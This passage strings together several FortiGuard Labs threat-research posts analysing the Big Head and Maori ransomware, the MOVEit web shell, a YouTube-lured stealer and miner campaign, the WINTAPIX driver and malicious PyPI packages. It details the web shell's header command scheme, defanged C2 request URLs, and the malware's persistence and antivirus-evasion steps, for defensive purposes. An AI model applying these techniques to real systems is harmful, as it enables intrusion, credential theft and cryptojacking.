“Read Me First!/txt” with the same ransom message as the wallpaper. Variant B also tries to open the attacker’s Github page on a default Web browser; however, the page is unavailable because it has been removed or shut down. The attacker’s Bitcoin wallet recorded two transactions: one in December 2022 for $313.93, the other in August of the same year for $70.07. Since the Big Head ransomware came out in May 2023, those transactions do not appear to be related to the ransomware variant. Ransomware of the Same Stripe FortiGuard Labs found another ransomware variant that, based on the Bitcoin wallet and email address, was likely used by the same attacker. This ransomware was also submitted to a publicly available file scanning service in May 2023, the same month the Big Head ransomware variants were made available. This ransomware variant encrypts files and appends the attacker’s contact email address, “poop69new@[redacted],” to the file names. It also replaces the desktop wallpaper with its own that includes the following ransom note. It also leaves an alternative ransom note labeled “read_it.txt”. Most of the Big Head ransomware samples were submitted from the United States. Another ransomware used by the same attacker was submitted from the United States, Spain, France, and Turkey. Fortinet customers are already protected from this malware variant through AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Big Head ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected.

Since the majority of ransomware is generally delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises).

    "content": "FortiGuard Labs Threat Research Affected Platforms:All unpatched MOVEit Transfer versions running a SQL databaseImpacted Users:Any organization that uses a vulnerable version of MOVEit TransferImpact:Remote attackers can install a backdoor and exfiltrate dataSeverity Level:High FortiGuard Labs is aware of a critical zero-day SQL injection vulnerability in the MOVEit Secure Managed File Transfer software (CVE-2023-34362) allegedly exploited by the Cl0p ransomware threat actor. High-profile government, finance, media, aviation, and healthcare organizations have reportedly been affected, with data exfiltrated and stolen. Due to its severity, CISA released anadvisoryfor the vulnerability on June 1st, 2023. They also updated theKnown Exploited Vulnerabilitiescatalog on June 2ndwith CVE-2023-34362. This blog contains information on what you need to know about CVE-2023-34362. For further details, please see the relatedFortiGuard Labs Outbreak Alert. MOVEit Transfer is a commercial secure managed file transfer (MFT) software solution that enables the secure movement of files between organizations and their customers using SFTP, SCP, and HTTP-based uploads. MOVEit Transfer is vulnerable to a SQL injection vulnerability that could allow an unauthenticated attacker to access MOVEit Transfer's database.  Structured Query Language (SQL) allows queries and commands to be executed against a relational database. An injection vulnerability allows an attacker to manipulate one of these queries to exploit a system to retrieve data or make changes. In this case, an attacker could pull data from the database that would otherwise be secured, execute their own SQL queries, and change and delete data. This vulnerability affects versions of MOVEit before 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), and 2023.0.1 (15.0.1) as well as versions using the following engines to host the actual database: MySQL [open-source relational database management system], Microsoft SQL Server [Microsoft on-premises relational database management system], and Azure SQL [Microsoft cloud-based relational database management system]). Reportedly, a web shell that acts as a backdoor was deployed, and data exfiltration was performed after successfully exploiting the vulnerability. However, as described in the next section, attackers can deploy any file after exploitation. At the time of this writing, a CVSS score still needs to be assigned for the vulnerability. Our investigation on a web shell backdoor likely installed after CVE-2023-34362 was successfully exploited revealed that all commands to the backdoor are sent through extra HTTP request headers. A password is needed to verify the attacker and allow access to the backdoor. This is sent with the \"X-siLock-Comment\" header. If the password is invalid, the backdoor will respond with a 404 HTTP status code to pretend the backdoor doesn't exist. We also discovered that the web shell has the following attack flows: 1.     Delete the service account. The HTTP request headers should include the following: If \"-2\" is sent with an \"X-siLock-Step1\" header, the backdoor deletes any users from the \"user\" table in the database that has the actual name of \"Health Check Service.\" 2.     List database files. The HTTP request headers should include the following: If \"-1\" is sent with an \"X-siLock-Step1\" header, the backdoor list files in the database. The file listing also includes file metadata. It tries to include the file's id, name, and size. It also tries to display the file's location (folder path) and which user owns/uploaded the file. The listing also tries to include which institution the file is associated with. 3.     Create a new service account. The HTTP request headers should include the following: If an integer is sent with an \"X-siLock-Step1\" header, and it isn't \"-1\" or \"-2\", the backdoor assumes it is an institution id. Institution ids can be enumerated from step 2 in the attack flow when the database files are listed. The attacker is trying to create a new service account for a specific institution. To ensure step 1 in the attack flow was successful, this command first looks for users with an active session and a permission level of \"30\" belonging to the institution. If no account with the real name of “Health Check Service” exists, the backdoor creates a new username containing 16 random alphanumeric characters. It inserts that as the new Health Check Service account for the specified institution. It then tries to add that to the list of currently active sessions using the IP address 127.0.0.1 since the service account is supposed to be local. 4.     Download arbitrary files. The HTTP request headers should include the following: If an institution id, folder id, and file id are all included, it attempts to download the file. These values can be obtained from step 2 in the overall attack flow. While we do not know precisely how many organizations were impacted by this vulnerability, publicly available information indicates that several high-profile organizations have been compromised. The web shell backdoor, likely deployed due to the successful exploitation of CVE-2023-34362, was submitted to a public file scanning service from the United States, the United Kingdom, Germany, Italy, India, and Pakistan. As such, potential victims could likely be located in those countries. The vendor released an advisory on May 31st, 2023, along with the timeline: The advisory contains Indicators of Compromise (IOCs) that can help cybersecurity professionals identify attacks leveraging CVE-2023-34462. Yes. A vendor patch was released on May 31st, 2023. FortiGuard Labs has the following AV signature available for the available web shell backdoor samples reportedly deployed after CVE-2023-34362 was exploited: FortiGuard Labs released the following IPS signature for CVE-2023-34362 in version 23.570: Webfiltering blocks Network IOCs listed on the security advisory issued by Progress. For a comprehensive list of protections from FortiGuard Labs, please visit theOutbreak Alert pagefor further details. Yes,the vendor advisorycontains mitigation that can be applied before applying the vendor patch. CVE-2023-34362 has allegedly been leveraged by the Cl0p ransomware threat actor to compromise multiple organizations for data exfiltration and other malicious activities. Now that the vulnerability has gained public attention, we expect other threat actors to also leverage this vulnerability, and new attempts at exploitation will likely be accelerated. As such, FortiGuard Labs strongly urges MOVEit Transfer users to apply all patches and implement mitigations provided by the vendor as soon as possible. FortiGuard Labs will continue to actively monitor the situation for further insights and provide additional information about protections as they become available.

    "content": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Any organizationImpact:Remote attackers steal credentials, sensitive information, and cryptocurrency and perform cryptojacking on systemsSeverity Level:Critical FortiGuard Labs came across an ongoing threat campaign targeting YouTube viewers searching for pirated software earlier this month. Videos advertising downloads of “cracked” (aka pirated) software are uploaded by verified YouTube channels with a large number of subscribers. Victims are led to execute malicious binaries that install multiple malware into their systems focused on harvesting credentials, cryptojacking, and stealing cryptocurrency funds from wallets. While investigating this campaign,other researcherspublished a report about it. And although there are overlaps with our findings, this report provides additional observations, such as the deployment of a third malware family being distributed to the victims. This article describes the entire attack chain and technical details on the malware components that make up this campaign. The uploaded videos lure users searching for pirated software by using titles such as “Adobe Acrobat Pro dc Crack 2023 free full version / Adobe Acrobat Free Download”. Some videos display tutorials for using the pirated software, although in most cases, they simply display static images often unrelated to the software product (Figure 1). For more credibility, the malware campaign utilizes verified YouTube channels withlarge numbers of followers. In fact, one of the YouTube channels observed hasnearly 3 million subscribers (Figure 2). As these YouTube channels have uploaded legitimate videos in the past, we suspect these accounts may have been compromised. Similar comments (likely auto-generated) were posted for some of the videos, which suggests the possibility of an automated video uploading and commenting process (Figure 3). Potential victims are led to download a password-protected archive from a file-sharing service. The malicious URLs and passwords (usually four numeric digits) are located in the video’s description and the comments section (Figure 4). The videos seem to be uploaded in batches. For instance, one of the accounts uploaded over 50 videos within eight hours, offering different pirated software that all led to the same URL. The videos are deleted after some time, after which the threat actors upload the videos to other accounts. As shown in Figure 5, after downloading the RAR archive2O23-F1LES-S0ft.rarvia the URL provided in the YouTube video description, the victim must uncompress the archive with the password “1212,” listed together with the URL, and run theLauncher_S0FT-2O23.execontained within. The archive also contains multiple unused files and directories, possibly to masquerade as a legitimate installer. A detailed analysis of each component is provided in the following sections. Launcher_S0FT-2O23.exeis the Vidar infostealer. It is appended with over 1GB of unused bytes, a technique commonly used to bypass antivirus and sandboxes that do not scan files beyond a specific size due to limited CPU and RAM resources. The SHA256 hash of this file is820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c(original) ande256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb(after removing excess bytes). Once executed, it sends an HTTP GET request to its Command and Control (C2) server at 79.137.206[.]228 to check in and retrieve the stealer configuration (Figure 6). Note the absence of User-Agent and other typical HTTP headers in this GET request. The semicolon delimited configuration can be interpreted as follows: Based on this configuration, this stealer will collect passwords stored locally (e.g., FTP, SSH), browser cookies and history, Telegram data, and screenshots. Cryptocurrency wallet collection is not enabled. Once the sensitive information has been collected and compressed into a ZIP file, the malware will exfiltrate this data to the C2 via an HTTP POST request (Figure 7). The POST request contains“id”,which represents the stealer and is the same for every infected user, and a “token” previously provided by the C2 server in the check-in request. The“file”contains a Base64-encoded ZIP file with the data collected by the malware. Figure 8 shows the contents of the ZIP file. Information.txt includes information on the OS, hardware, running processes, and installed software on the infected system (Figure 9). The C2 server then responds with a list of secondary payloads for the malware to download and execute (Figure 10). This sample downloads files stored as releases in GitHub repositories owned by the userjesus061031r. Similar malicious files with different filenames are scattered among other repositories owned by the same user. These files are written to%ProgramData%with randomized filenames containing 20 numeric characters and are executed sequentially. Once the payloads are executed, the malware exits and deletes itself. Analyses of the payloads are discussed in the following sections. This sample was identified as Vidar Stealer based on the C2 protocol, the system data format ininformation.txt,and the organization of the files in the exfiltrated ZIP. While Vidar is a distinctly different malware family from RecordBreaker observed by other researchers tracking the same campaign, both are infostealers, which indicates the threat actor’s primary interest in stealing credentials to further their malicious objectives. GUI_MODERNISTA.exe (SHA256:62d4caf908b3645281d5f3c0f5b5dc3a4beb410015196f7eaf66ca743f415668) is a relatively small (48KB) .NET application that redirects users to hardcoded URL links to files on file-sharing sites containing the purportedly cracked (and illegal) versions of software, as advertised by the YouTube video. This is the only component displayed to the victim, as the other components of the attack chain run covertly in the background. During our research, we also collected a Python version (SHA256:ba9503b78bc62d4e5e22e4f8e04b28bb6179e146e1c0a6ba14dd06608facb481) of this application. The UI of both versions is shown in Figure 11. Vadwax.exe(SHA256:f91d9de259052595946250a1440a2457dbda9ee8aec8add24419ff939f13e003) is 1.17 GB in size but comprised mainly of an overlay of the repeating bytes 0x30, which corresponds to “0” in ASCII (Figure 12). After removing the unused overlay, we ended up with a much smaller 5.87 MB file (SHA256:2fcb61da34b259b9b130c0c75525697931b9dff8e7f9b2198f9db21b5193eeba). Like the earlier sample, this artificial inflation is used to circumvent AV solutions. This sample is Laplas Clipper, which attempts to substitute wallet addresses in the user’s clipboard to steal cryptocurrency. It constantly checks the content of the Windows clipboard against regular expressions retrieved from the C2 server. Upon a match, the content of the clipboard is sent to the C2 server, which responds with the threat actor’s wallet address for the appropriate cryptocurrency for replacement. This enables Laplas Clipper to switch the original payee’s wallet address with the threat actor’s and divert the funds to the threat actor instead. This particular sample is protected by the commercial VMProtect packer with heavy use of anti-sandbox and anti-analysis checks. As Laplas Clipper has been described by other researchers, we will just focus on the persistence and C2 communication of this sample. Persistence: This sample checks to see if it is being run from the%Appdata%directory. If not, it copies itself at%Appdata%\\telemetry\\svcservice.exeand appends an overlay containing randomized bytes to the file. It then maintains persistence by adding a registry value namedtelemetryto the following key: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Communication: Laplas Clipper first registers with the C2 server using the current machine name and Windows username (guidparameter) and a 64-character hexadecimal string (keyparameter) via an HTTP GET request tohxxp://85[.]192[.]40[.]252/bot/online?guid=<machine name>/<username>&key=<hexadecimal string> After successfully registering with the C2 server, it requests regular expressions fromhxxp://85[.]192[.]40[.]252/bot/regex(Figure 13). The regular expressions hunt for the addresses of the following cryptocurrencies in the clipboard (ordered alphabetically): Incidentally, the Laplas Clipper C2 panel at laplas[.]app resolves to 85[.]192[.]40[.]252 (Figure 14). Vaxa.exe (SHA256:44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f) is an in-memory loader for an embedded miner downloader payload. It is a 32-bit Windows console application masquerading as a program for performing and displaying the results of some simple math operations (Figure 15). It then proceeds to decrypt the shellcode and payload from its body. The shellcode is provided with the path of the application to inject the payload into before execution is redirected to it (Figure 16). The shellcode uses process hollowing to inject and execute a .NET assembly namedTask32Main(SHA256:5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3) within Regsvcs.exe. Task32Main – Miner Downloader Task32Mainis a .NET downloader and installer for Monero cryptomining components. It provides supporting functionality, such as maintaining persistence and AV evasion. More importantly, it is responsible for installing the watchdog component, which ensures that the miner is kept running in the victim system. To avoid being detected, it executes encoded PowerShell commands to add the following to the directories on the Windows Defender's scanning exclusion list: It then downloads a configuration file fromhxxps://pastebin[.]com/raw/5p5KkdBwto download other malware payloads and their execution parameters (Figure 17). A modified copy of this configuration is written aslog.uceto the following directories: This will be used as the configuration file for the watchdog component discussed in the next section. The above configuration instructs the malware to download additional cryptomining-related payloads from the following URLs: The malware creates the directory%ProgramData%\\Dllhostand saves the downloaded files asdllhost.exe(miner watchdog) andwinlogson.exe(Monero XMRig miner), respectively. The malware then modifies the directory’s permissions to deny access to the current user. To persist in the victim system, it then adds several scheduled tasks to execute the watchdogdllhost.exeevery hour. It does this by executing the following command: The scheduled task names impersonate legitimate Windows-related software to deter casual detection and are as follows: It also changes the power settings of the system to prevent it from hibernating and sleeping by executing the following command to ensure that its Monero cryptominer component (executed later) is always running while the machine is powered up: The host file is also modified to resolve security product-related domains to the IP 0.0.0.0 to disable communication by security products, e.g., for downloading updates. Lastly, it executes the watchdog component%ProgramData%\\dllhost.exe, which executes the actual cryptominer. Dllhost.exe - Miner watchdog Dllhost.exe(SHA256:d2e371810e8c7b1e039a02a578b1af0c6250665e85206b97a1ecb71aa5568443) is a .NET assembly namedTask32Watch. It is a watchdog application that executes the miner component, monitors its process, and ensures it is kept running and uses the latest mining parameters. It reads its own configuration file,log.uce, previously dropped by the installer componentTask32Main.It has the same content as the configuration file downloaded by theTask32Maincomponent, excluding the first three lines. Moreover, it includes the Pastebin URL where the configuration file was downloaded as the last line. This Pastebin URL allows the watchdog to retrieve the latest XMRig mining parameters (e.g., mining pool server, wallet address, worker name “snnssnewte”, etc.). It then executes the miner winlogson.exe located in the same directory with these mining parameters. As a watchdog, it ensures that the miner process is always running by constantly enumerating the processes currently running in the system and then re-running the miner if it is terminated. In addition, to lessen the chance of getting discovered and being terminated by the user, it kills processes related to system diagnostics and analysis tools, such as Task Manager and Process Hacker. Lastly, it also ends games-related processes, which are usually resource-intensive and reduce the CPU resources available for mining. This campaign highlights the dangers of downloading illegally pirated copies of software because of the tendency of threat actors to prey on such users to steal credentials, sensitive data, or even cryptocurrency. On top of this, the infected machine is also used for cryptojacking to mine Monero for the threat actor. The agility of these threat actors is also a cause for concern, as we observed the threat actor behind this campaign rapidly uploading new copies of similar malware whenever GitHub takes down the malicious repositories. FortiGuard Labs will continue to monitor and report on updates to this threat campaign.

    "title": "WINTAPIX: A New Kernel Driver Targeting Countries in The Middle East",
    "link": "https://www.fortinet.com/blog/threat-research/wintapix-kernal-driver-middle-east-countries",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Windows UsersImpact:Allows remote code execution and persistent access to the host (backdoor) and the rest of the network (proxy)Severity level:Medium At Fortinet, we monitor suspicious executables that make use of open-source tools and frameworks. One of the things that we keep an eye out for is tools that use theDonutproject. Donut is a position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters. During our daily threat-hunting process in early February, we encountered a kernel driver that used the Donut tool and caught our attention for further analysis. The sample that triggered our rule was a driver called WinTapix.sys (which is why we named it WINTAPIX). Since it uses Donut, we decided to analyze it further. It turned out to be a very interesting sample that we believe is being used in targeted attacks against countries in the Middle East. This captured sample was compiled in May 2020 but was only uploaded to Virus Total in February of this year. Pivoting from this sample, we found another variant of this driver with the same name that was compiled around the same time, but it was uploaded to Virus Total in September 2022. Pivoting again from the used certificates, we found another variant of the WINTAPIX driver with the SRVNET2.SYS name. This sample was compiled in June 2021 and was first observed in the wild in December 2021. Based on the information we have collected so far, we now believe that this driver has been active in the wild since at least mid-2020 and, to the best of our knowledge, has not been reported before. Observed telemetry shows that 65% of the lookups for this driver were from Saudi Arabia, indicating it was a primary target. This same telemetry shows a considerable increase in the number of lookups for this driver in August and September 2022 and again in February and March 2023. This may indicate that the actor(s) behind this driver was operating major campaigns on these dates. However, we still do not have enough information about how this driver has been distributed and who was behind these operations. Based on the victimology, we suspect an Iranian threat actor developed this driver. Observed telemetry shows that while this driver has primarily targeted Saudi Arabia, it has also been detected in Jordan, Qatar, and the United Arab Emirates, which are the classic targets of Iranian threat actors. Since Iranian threat actors are known to exploit Exchange servers to deploy additional malware, it is also possible that this driver has been employed alongside Exchange attacks. To that point, the compilation time of the drivers is also aligned with times when Iranian threat actors were exploiting Exchange server vulnerabilities. The attribution process of this driver is still ongoing, and we will provide additional info when we have a better idea about the identity of the threat actor or group. In this blog post, we provide a comprehensive analysis of this driver. We analyzed the sample with the SHA-256 hash of 8578bff36e3b02cc71495b647db88c67c3c5ca710b5a2bd539148550595d0330, also known as Wintapix.sys. As the file extension suggests, this is a Windows Kernel Driver. Figure 1 shows some of its attributes. Its digital signature is invalid, meaning the threat actor might first need to load a vulnerable (but legitimate) driver and exploit that to load the Wintapix.sys. But once the driver is loaded, the following execution chain runs: We will look at these artifacts in more detail in the rest of the analysis. Wintapix.sys is partially protected by VMProtect, a software protection tool that uses virtualization to protect software applications from reverse engineering and unauthorized usage. It transforms the original executable file into a virtualized code executed in a protected environment, making it difficult to analyze and tamper with. However, not all functions in the driver are protected, including the code that creates the next stage of the attack, which is the focus of the analysis. Wintapix.sys is essentially a loader. Thus, its primary purpose is to produce and execute the next stage of the attack. This is done using a shellcode. Interestingly, the shellcode (Figure 3) is hardcoded in the binary without any obfuscation. This defeats the purpose of protecting most of the binary with VMProtect since most Anti-Virus engines can identify the embedded shellcode. To inject the shellcode, the driver must first find a suitable target process. The requirements for the target process are as follows: Once a suitable process is found, it is opened with ZwOpenProcess(), and memory is allocated in the target process’s memory with ZwAllocateVirtualMemory(). Finally, NtWriteVirtualMemory() injects the embedded shellcode into the target process (Figure 5). The address of NtWriteVirtualMemory() is recovered in runtime, helping to hide the function call from static analyzers. Another important function of Wintapix.sys is to set up persistence. This is first done by creating register keys at the following places: Interestingly, the driver is set to load in Safe Boot. Safe Boot, also known as Safe Mode, is a diagnostic startup mode in Windows that launches the system with minimal drivers and services. It is designed to help users troubleshoot and resolve software or driver-related issues that might prevent the system from starting normally. Loading the driver in Safe Boot also adds another layer of persistence to the mix. All created registry keys are monitored using the ZwNotifyChangeKey(). This Windows kernel-mode function allows monitoring changes to a specified registry key. The function notifies the caller of any changes to the registry key by signaling the event or invoking the APC (asynchronous procedure call) routine. This makes it useful for applications that need to react to registry modifications in real time. This allows the malware to reset itself in the registry after it has been removed. It also starts a new thread with PsCreateSystemThread() to monitor the file location of Wintapix.sys. It uses NtNotifyChangeDirectoryFile() to monitor changes in the file. Should Wintapix.sys be deleted, it will write it back to the same location. Fortunately, the embedded shellcode can be dumped from Wintapix.sys and analyzed separately. It quickly revealed that the shellcode was created using the Donut project. Donut allows you to convert any .NET assembly or shellcode file into position-independent shellcode, which can then be injected into a target process using techniques like process hollowing or thread hijacking. The generated shellcode is self-contained and does not rely on any external dependencies. This means that the primary goal in our analysis should be to extract the next attack stage, which should be a .NET assembly. The .NET payload can be extracted from the Donut shellcode by identifying and breaking the decryption function in a debugger. After decryption runs, the .NET assembly can be dumped from memory. Once the payload is saved into a file, we analyzed it as a stand-alone .NET executable. Of course, one of the advantages of .NET binaries (from a reverse engineering point of view) is that they can be easily decompiled into source code. This, of course, is a tremendous help in understanding the binary’s goals and capabilities. Detect It Easy (Figure 8), however, tells us that this executable has been protected by multiple obfuscators, particularly Smart Assembly and Eazfuscator. Because of this, the deobfuscator tools did not help much, and we just had to live with the challenge. The program's main function first decodes two arrays using the GetListUrls() function (Figure 9), suggesting that the results contain URLs. The array called ‘input’ contains the following decoded values: \"accidents_\" \"js-\" \"aspnet_client_\" \"js_search-\" \"_book\" \"library-\" \"subject_\" \"lookup_data-\" \"_toj_web\" \"mng_data_bank_\" \"transactions-\" \"_models\" \"trn_fitness-\" \"news_\" \"update-\" \"_omrvision\" \"user_accounts-\" \"popup_\" \"violation-\" \"_program_steps\" \"workflow-\" The array called ‘input2’ contains the following values: \"programs_skill_\" \"competences-\" \"properties_\" \"-content\" \"_report\" \"evaluation-\" \"expert_data_\" \"css-\" \"_expert_form\" \"img-\" \"-field\" \"educat_\" \"reports-\" \"_employee\" \"-scales\" \"files_\" \"scripts-\" \"_fonts\" \"-skill\" \"helpes_\" These values are used to construct URLs. However, the malware is looking for Microsoft Internet Information Services (IIS) characteristics to build them. This means that this malware only targets IIS servers. On machines without IIS installed, it will simply crash. Given the IIS characteristics shown in Figure 10, the malware extracts the sites hosted by the IIS server. And using that and the strings listed above, it constructs a list of URL templates that it will listen on. These URL lists are used in the two main functionalities of the payload: The list named ‘input2’ is used for the backdoor functionality. It starts an HTTP listener on these URLs and uses the Program.HandleRequest() function to handle any incoming requests, which then refers to RequestHandler.Execute()(Figure 11). Let’s start from the end. If the incoming request contains the string ‘wOxhuoSBgpGcnLQZxipa’, then the string ‘UsEPTIkCRUwarKZfRnyjcG13DFA’ is sent back. This seems to be a kind of heartbeat implementation. If the request has a ‘Jet’ or ‘<space>Ver’ parameter, their values are base64-decoded and used to build a command using cmd /c <command>. This is then passed to the RunCommand() function, which executes them with Process.start(). Their output will be sent back in the response to the request. And finally, if the request has a body, then the RunData() function (Figure 12) is called. RunData() decrypts the body of the request and, depending on the message type, implements the following actions: Encryption is implemented for both incoming and outgoing messages. The attribute PrivateKey (Figure 13) suggests that it implements some kind of asymmetric encryption algorithm. However, after looking further into the code, we discovered that calling it a ‘PrivateKey’ is just an exaggeration. In reality, there is nothing asymmetric about it, the program implements a simple XOR encoding (Figure 14) as decryption and encryption using the ‘PrivateKey’ as a key. The values from the list ‘input’ are used to start proxy listeners with Proxy.HandleRequest() on those URLs. This part of the program can handle a variety of data streams. If it’s just data, it will act as a simple proxy, sending and receiving data between the two sides of the proxy. However, it can also accept RDP configuration data (Figure 15). Using this RDP data, it can open a connection to the target RPD server and proxy it to the threat actor. This blog provided a detailed analysis of a driver named WinTapix, which we identified in early Feb of this year. The driver uses a Donut open-source payload to inject its shell code. It seems to be primarily targeting Saudi Arabia. The attribution process of this driver is still ongoing, but based on the victims, we assess with low confidence that this is a work of an Iranian threat actor. Fortinet customers are already protected from these APT and cyber-crime campaigns through FortiGuard’s AntiVirus, FortiMail, and FortiClient services, as follows: The following (AV) signatures detect the malicious documents mentioned in this blog: W32/PossibleThreatW64/AI.Native.Suspicious.AVENW32/GenCBL.BAK!tr FortiEDR natively detects and blocks the malicious executables identified in the report based on their behavior.

    "link": "https://www.fortinet.com/blog/threat-research/more-supply-chain-attacks-via-malicious-python-packages",
    "content": "FortiGuard Labs Threat Research The FortiGuard Labs team discovered over 30 new zero-day attacks in PyPI packages (Python Package Index). These were found between late March and late April by monitoring an open-source ecosystem. In this blog, we will cover all the packages that were found, grouping them into similar attacks or behavior. Some of these sets may have been shown in aprevious blog. 1.     The packages in the following set were found to be similar: As explained in our last blog, the setup.py file in these packages tries to execute a Python script written to connect to a URL that may contain malicious code. 2.     The next set of packages includes: The setup.py file in these packages tries to steal information, such as credit cards, wallets, account logins, etc. using a Discord webhook. 3.     This set includes the following package: The setup.py file in this package tries to download a zip file to a directory (depending on the Python version), extract its contents, run a script contained in the zip file, and then remove its directory. 4.     This set includes the following package: The setup.py file in this package connects to a URL to download and run a potentially malicious script. 5.     This set includes the following package: Its setup.py file tries to execute the encoded data shown in Figure 5. The decoded data (shown below) tries to connect to a URL to write potentially malicious data to a Python script, which it then runs. It then removes the script. 6.     The packages in this set include: Similar to set two, these packages tr yto steal sensitive information such as wallets, login information, cookies, etc., using a webhook. Its code includes a GitHub link tohttps://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook, indicating that it may be a BlackCap webhook stealer. It also includes additional features, such as bypassing VM machines, hiding itself, and injection techniques, etc. This time, the malicious code is found in __init__.py 7.     Package seven includes: When examining its setup.py, we found that it tries to run the encoded data shown below. Once decoded, we see that it creates and runs an executable file that accesses and exfiltrates sensitive data. 8.     This set includes the following package: This package’s setup.py file reveals the execution of encoded data, as shown in Figure 11. Once decoded (Figure 12), we see that it tries to retrieve potentially malicious data—most likely an executable from a URL—to write to a file, which it then tries to run. 9.     This set includes the following package: This package contains multiple layers of obfuscation in its setup.py file, as shown in Figure 12. While it could not fully run, it still dropped a script named ‘WindowsDefender.py,’ which provides clues that it will execute a potentially malicious script that it retrieved from a file-sharing website, as shown in Figure 13. As this blog shows, we are seeing more—and more different—types of malicious Python packages being loaded into an open-source ecosystem, each with a unique method of attack. Given the increasing number and variety of attacks, end users should keep an eye out for suspicious packages and take caution before using them. We will continue to report current information on malicious packages to help users avoid becoming a victim of a supply chain attack.

    "title": "Ransomware Roundup - Maori",

    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Maori ransomware. Affected platforms:LinuxImpacted parties:Linux UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Overview FortiGuard Labs recently came across a new ransomware variant called Maori. Like other ransomware variants, it encrypts files on victims’ machines to extort money. Interestingly, this variant is designed to run on Linux architecture and is coded in Go, which is somewhat rare and increases the analysis difficulty. Infection Vector Information on the infection vector used by the Maori ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. At the time of this research, there is no indication that Maori is widespread. Ransomware Execution Maori targets all user files in their home directory (Linux; “/home/<username>”). It ignores files placed elsewhere (including those just in the “/home/” directory as well as in other Linux system directories, like “/”). Due to this narrow objective, it accomplishes its job very quickly. Upon completion, the Maori executable deletes itself from the victim machine. All affected files are appended with a “.maori” extension, and a “README_MAORI.txt” file is dropped into each directory with encrypted files. The entire contents of each affected file are encrypted, rather than just enough of the contents to render them unusable. As a result, files end up slightly larger than the original, as seen in the size differences between Figures 1 and 2. As mentioned, a ransom note is deposited into each directory that has had its files encrypted. The note asks the victim to contact them using Tox (a peer-to-peer, end-to-end encrypted messenger application). It also provides an onionmail e-mail address as a backup communication method and unique strings for both to provide as identification to the Maori operators. No monetary sum is listed as a ransom amount. Fortinet Protections Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Maori ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. File-based IOCs: SHA256 Malware a5ed581ad5cd1a2f29473cb56116cd179bfe61a924969b2dedbe07660eef9bc5 Maori ransomware FortiGuard Labs Guidance Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. 